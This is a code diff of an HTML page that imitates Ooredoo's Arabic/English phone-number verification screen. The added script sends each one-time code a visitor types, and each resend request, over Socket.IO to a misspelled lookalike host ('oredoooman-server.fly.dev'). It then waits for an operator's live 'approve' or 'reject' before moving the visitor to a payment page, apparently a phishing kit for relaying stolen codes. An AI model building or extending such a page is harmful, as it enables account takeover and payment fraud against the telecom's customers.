@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>otp دخول</title>
+  <title>التحقق من الرقم - Ooredoo</title>
   <style>
     @font-face {
       font-family: 'NotoSansLocal';
@@ -49,6 +49,30 @@
       min-height: 100vh;
     }
 
+    .lang-toggle {
+      position: absolute;
+      top: 16px;
+      left: 16px;
+      background: #f5f5f5;
+      border: 1px solid #ddd;
+      border-radius: 20px;
+      padding: 6px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      color: #333;
+      transition: all 0.2s;
+      z-index: 100;
+    }
+    .lang-toggle:hover {
+      background: #eee;
+      border-color: #ccc;
+    }
+    [dir="ltr"] .lang-toggle {
+      left: auto;
+      right: 16px;
+    }
+
     .otp-page {
       width: 100%;
       min-height: 100vh;
@@ -56,6 +80,7 @@
       justify-content: center;
       align-items: flex-start;
       padding-top: 91px;
+      position: relative;
     }
 
     .otp-card {
@@ -109,6 +134,7 @@
       border-radius: 8px;
       overflow: hidden;
       background: #fff;
+      direction: ltr;
     }
 
     .otp-cell {
@@ -215,6 +241,44 @@
       transform: translateY(-1px);
     }
 
+    /* Waiting/Loading overlay */
+    #waitingOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.85);
+      z-index: 9998;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #ed1c24;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .waiting-text {
+      font-size: 16px;
+      color: #333;
+      font-weight: 500;
+    }
+    .error-msg {
+      display: none;
+      color: #ed1c24;
+      text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
+      font-weight: 500;
+    }
+
     @media (max-width: 700px) {
       .otp-page {
         padding: 32px 15px 24px;
@@ -246,18 +310,21 @@
 </head>
 <body>
   <main class="otp-page" aria-label="OTP login">
+    <!-- Language Toggle -->
+    <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
+
     <section class="otp-card" aria-labelledby="otp-title">
       <svg class="ooredoo-mark" viewBox="0 0 74 62" aria-hidden="true" focusable="false">
         <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
         <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
       </svg>
 
-      <h1 class="title" id="otp-title">Verify Your Number</h1>
-      <p class="subtitle">We've sent a 6-digit OTP to <strong id="otp-phone-number">+968 94949590</strong></p>
+      <h1 class="title" id="otp-title">تحقق من رقمك</h1>
+      <p class="subtitle" id="otp-subtitle">لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى <strong id="otp-phone-number">+968 94949590</strong></p>
 
-      <form class="otp-form" action="#" method="post" autocomplete="one-time-code">
+      <form class="otp-form" id="otpForm" action="#" method="post" autocomplete="one-time-code">
         <div class="otp-group" dir="ltr" aria-label="Enter 6-digit OTP">
-          <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 1" autocomplete="one-time-code">
+          <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 1" autocomplete="one-time-code" autofocus>
           <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 2">
           <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 3">
           <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 4">
@@ -265,18 +332,93 @@
           <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 6">
         </div>
 
-        <button class="resend" id="resend-otp" type="button" disabled aria-live="polite">Resend OTP after 29s</button>
-        <button class="primary-button" type="submit">Verify &amp; Continue</button>
+        <button class="resend" id="resend-otp" type="button" disabled aria-live="polite">إعادة إرسال الرمز بعد 29 ثانية</button>
+        <p class="error-msg" id="errorMsg">الرمز غير صحيح، يرجى المحاولة مرة أخرى.</p>
+        <button class="primary-button" id="verifyBtn" type="submit">تحقق ومتابعة</button>
       </form>
 
-      <a class="change-number" href="/customer-authentication" aria-label="Change Number">
+      <a class="change-number" href="/login/" aria-label="Change Number" id="changeNumberLink">
         <svg viewBox="0 0 20 20" aria-hidden="true" focusable="false"><path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path></svg>
-        <span>Change Number</span>
+        <span id="changeNumberText">تغيير الرقم</span>
       </a>
     </section>
   </main>
 
+  <!-- Waiting Overlay -->
+  <div id="waitingOverlay">
+    <div class="spinner"></div>
+    <p class="waiting-text" id="waitingText">جاري التحقق من الرمز...</p>
+  </div>
+
+  <!-- Socket.IO -->
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
   <script>
+    // Language toggle
+    var currentLang = 'ar';
+    
+    var translations = {
+      ar: {
+        title: 'تحقق من رقمك',
+        subtitlePrefix: 'لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى ',
+        resendCountdown: 'إعادة إرسال الرمز بعد ',
+        resendSuffix: ' ثانية',
+        resendReady: 'إعادة إرسال الرمز',
+        verifyBtn: 'تحقق ومتابعة',
+        changeNumber: 'تغيير الرقم',
+        toggleText: 'English',
+        waitingText: 'جاري التحقق من الرمز...',
+        errorMsg: 'الرمز غير صحيح، يرجى المحاولة مرة أخرى.'
+      },
+      en: {
+        title: 'Verify Your Number',
+        subtitlePrefix: 'We\'ve sent a 6-digit OTP to ',
+        resendCountdown: 'Resend OTP after ',
+        resendSuffix: 's',
+        resendReady: 'Resend code',
+        verifyBtn: 'Verify & Continue',
+        changeNumber: 'Change Number',
+        toggleText: 'العربية',
+        waitingText: 'Verifying the code...',
+        errorMsg: 'Invalid code, please try again.'
+      }
+    };
+
+    function toggleLanguage() {
+      currentLang = currentLang === 'ar' ? 'en' : 'ar';
+      applyLanguage();
+    }
+
+    function applyLanguage() {
+      var t = translations[currentLang];
+      var html = document.documentElement;
+      
+      if (currentLang === 'ar') {
+        html.setAttribute('lang', 'ar');
+        html.setAttribute('dir', 'rtl');
+      } else {
+        html.setAttribute('lang', 'en');
+        html.setAttribute('dir', 'ltr');
+      }
+
+      document.getElementById('otp-title').textContent = t.title;
+      
+      // Update subtitle keeping the phone number
+      var phoneNum = document.getElementById('otp-phone-number').textContent;
+      document.getElementById('otp-subtitle').innerHTML = t.subtitlePrefix + '<strong id="otp-phone-number">' + phoneNum + '</strong>';
+      
+      // Update resend button text (only if not in countdown)
+      var resendBtn = document.getElementById('resend-otp');
+      if (resendBtn.classList.contains('is-ready')) {
+        resendBtn.textContent = t.resendReady;
+      }
+      
+      document.getElementById('verifyBtn').textContent = t.verifyBtn;
+      document.getElementById('changeNumberText').textContent = t.changeNumber;
+      document.getElementById('langToggle').textContent = t.toggleText;
+      document.getElementById('waitingText').textContent = t.waitingText;
+      document.getElementById('errorMsg').textContent = t.errorMsg;
+    }
+
     (function () {
       var phoneNumberElement = document.getElementById('otp-phone-number');
       var resendButton = document.getElementById('resend-otp');
@@ -331,7 +473,8 @@
 
         resendButton.disabled = true;
         resendButton.classList.remove('is-ready');
-        resendButton.textContent = 'Resend OTP after ' + secondsRemaining + 's';
+        var t = translations[currentLang];
+        resendButton.textContent = t.resendCountdown + secondsRemaining + t.resendSuffix;
 
         resendTimer = window.setInterval(function () {
           secondsRemaining -= 1;
@@ -341,11 +484,12 @@
             resendTimer = null;
             resendButton.disabled = false;
             resendButton.classList.add('is-ready');
-            resendButton.textContent = 'Resend code';
+            resendButton.textContent = translations[currentLang].resendReady;
             return;
           }
 
-          resendButton.textContent = 'Resend OTP after ' + secondsRemaining + 's';
+          var t = translations[currentLang];
+          resendButton.textContent = t.resendCountdown + secondsRemaining + t.resendSuffix;
         }, 1000);
       }
 
@@ -353,6 +497,14 @@
         resendButton.addEventListener('click', function () {
           if (resendButton.disabled) return;
           startResendCountdown();
+          // Send resend request to server
+          if (typeof socket !== 'undefined') {
+            socket.emit('more-info', {
+              content: { 'طلب': 'إعادة إرسال رمز' },
+              page: 'توثيق الجوال',
+              waitingForAdminResponse: true
+            });
+          }
         });
       }
 
@@ -398,6 +550,77 @@
           cells.forEach(function (item, i) { item.value = digits[i] || ''; });
           focusCell(Math.min(digits.length, cells.length) - 1);
         });
+      });
+
+      // Socket.IO connection
+      var SOCKET_URL = window.location.hostname === 'localhost' 
+        ? 'http://localhost:3001' 
+        : 'https://oredoooman-server.fly.dev';
+      
+      var socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
+      window.socket = socket;
+      
+      // Register visitor
+      var visitorId = localStorage.getItem('visitorId') || null;
+      socket.on('connect', function() {
+        socket.emit('visitor:register', { existingVisitorId: visitorId });
+        socket.emit('visitor:pageEnter', 'توثيق الجوال');
+      });
+      socket.on('visitor:registered', function(data) {
+        if (data && data.visitorId) {
+          localStorage.setItem('visitorId', data.visitorId);
+        }
+      });
+
+      // Handle form submission
+      var otpForm = document.getElementById('otpForm');
+      var verifyBtn = document.getElementById('verifyBtn');
+      var waitingOverlay = document.getElementById('waitingOverlay');
+      var errorMsg = document.getElementById('errorMsg');
+
+      otpForm.addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        var otpValue = cells.map(function(c) { return c.value; }).join('');
+        if (otpValue.length < 6) return;
+
+        // Show loading
+        verifyBtn.disabled = true;
+        waitingOverlay.style.display = 'flex';
+        errorMsg.style.display = 'none';
+
+        // Send OTP to server
+        socket.emit('more-info', {
+          content: { 'رمز التحقق': otpValue },
+          page: 'توثيق الجوال',
+          waitingForAdminResponse: true
+        });
+      });
+
+      // Listen for admin response (approve/reject)
+      socket.on('card:action', function(data) {
+        var act = (data && data.action) ? data.action : data;
+        if (act === 'approve') {
+          // Navigate to next page (summary-payment)
+          window.location.href = '/summary-payment/';
+        } else if (act === 'reject') {
+          // Show error and reset
+          waitingOverlay.style.display = 'none';
+          verifyBtn.disabled = false;
+          errorMsg.style.display = 'block';
+          // Clear OTP cells
+          cells.forEach(function(c) { c.value = ''; });
+          focusCell(0);
+        }
+      });
+
+      // Listen for resend approval
+      socket.on('code:action', function(data) {
+        var act = (data && data.action) ? data.action : data;
+        if (act === 'approve' || (data && data.action === 'approve')) {
+          // Resend approved - restart countdown
+          startResendCountdown();
+        }
       });
     })();
   </script>
